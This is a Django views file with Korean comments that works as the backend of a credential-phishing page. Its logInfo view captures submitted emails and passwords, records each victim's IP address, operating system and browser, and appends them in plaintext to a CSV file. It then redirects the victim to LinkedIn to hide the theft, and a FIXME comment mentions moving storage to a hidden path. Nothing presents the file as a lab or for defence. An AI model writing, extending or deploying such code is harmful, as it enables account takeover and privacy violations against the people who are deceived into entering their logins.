from django.http import HttpResponse
from django.shortcuts import render
from django.http import HttpResponseRedirect
import csv
import os
import re
from datetime import datetime
from pathlib import Path


def index(request):
    context = {}
    return render(request,'index.html', context)

def _client_ip(request):
    # 프록시/로드밸런서 뒤에 있을 수 있으므로 X-Forwarded-For 우선
    xff = request.META.get('HTTP_X_FORWARDED_FOR')
    if xff:
        # 가장 앞이 원래 클라이언트 IP
        return xff.split(',')[0].strip()
    return request.META.get('REMOTE_ADDR', '')

def _parse_browser(ua: str) -> str:
    # 순서 중요 (Edge/Edg → Chrome보다 먼저)
    m = re.search(r'Edg/([\d.]+)', ua) or re.search(r'Edge/([\d.]+)', ua)
    if m: return f'Edge {m.group(1)}'
    m = re.search(r'OPR/([\d.]+)', ua)  # Opera (Chromium)
    if m: return f'Opera {m.group(1)}'
    m = re.search(r'Chrome/([\d.]+)', ua)
    if m and 'Safari' in ua: return f'Chrome {m.group(1)}'
    # Safari는 Version/로 버전 표기
    if 'Safari' in ua and 'Version/' in ua:
        m = re.search(r'Version/([\d.]+)', ua)
        return f'Safari {m.group(1) if m else ""}'.strip()
    m = re.search(r'Firefox/([\d.]+)', ua)
    if m: return f'Firefox {m.group(1)}'
    m = re.search(r'MSIE ([\d.]+)', ua) or re.search(r'Trident/.*rv:([\d.]+)', ua)
    if m: return f'IE {m.group(1)}'
    return 'Unknown'

def _parse_os(ua: str) -> str:
    # Windows
    m = re.search(r'Windows NT ([\d.]+)', ua)
    if m:
        nt = m.group(1)
        win_map = {
            '10.0': 'Windows 10/11',  # UA로는 10과 11 구분 어려움
            '6.3': 'Windows 8.1',
            '6.2': 'Windows 8',
            '6.1': 'Windows 7',
            '6.0': 'Windows Vista',
            '5.1': 'Windows XP',
        }
        return win_map.get(nt, f'Windows NT {nt}')
    # macOS
    m = re.search(r'Mac OS X ([\d_]+)', ua)
    if m:
        return f'macOS {m.group(1).replace("_", ".")}'
    # iOS
    m = re.search(r'iPhone OS ([\d_]+)', ua) or re.search(r'iPad; CPU OS ([\d_]+)', ua)
    if m:
        return f'iOS {m.group(1).replace("_", ".")}'
    # Android
    m = re.search(r'Android ([\d.]+)', ua)
    if m:
        return f'Android {m.group(1)}'
    # Linux
    if 'Linux' in ua:
        return 'Linux'
    return 'Unknown'

def logInfo(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        now = datetime.now()
             # 메타데이터 추출
        ip = _client_ip(request)
        ua = request.META.get('HTTP_USER_AGENT', '')
        os = _parse_os(ua)
        browser = _parse_browser(ua)

        result = {
            'email': email,
            'password': password,  
            'parsingTime': now.strftime("%Y-%m-%d %H:%M:%S"),
            'ip': ip,
            'os': os,
            'browser': browser,
            
        }
        save_dict_to_csv(result)
    # FIXME, 숨김 경로에 저장하는 코드 추가
    return HttpResponseRedirect("https://kr.linkedin.com/")




FIXED_COLUMNS = [
    "email", "password", "parsingTime", "ip", "os", "browser",
]

def save_dict_to_csv(
    data: dict,
    filename: str = os.path.join(
        os.path.expanduser('~'), 'Desktop', 'django-project', 'result', "output.csv"
    ),
    field_order: list[str] | None = None
):
    if not isinstance(data, dict):
        raise ValueError("입력 데이터는 딕셔너리여야 합니다.")
    path = Path(filename)
    path.parent.mkdir(parents=True, exist_ok=True)
    write_header = (not path.exists()) or (path.stat().st_size == 0)
    if field_order is None:
        field_order = FIXED_COLUMNS if FIXED_COLUMNS else list(data.keys())
    row = {k: data.get(k, "") for k in field_order}
    try:
        with path.open(mode='a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=field_order, extrasaction='ignore')
            if write_header:
                writer.writeheader()     # 파일이 비어 있을 때만 헤더 기록
            writer.writerow(row)         # 데이터 행 추가
        print(f"[✓] CSV 파일 저장 완료: {filename}")
    except Exception as e:
        print(f"[✗] CSV 저장 중 오류 발생: {e}")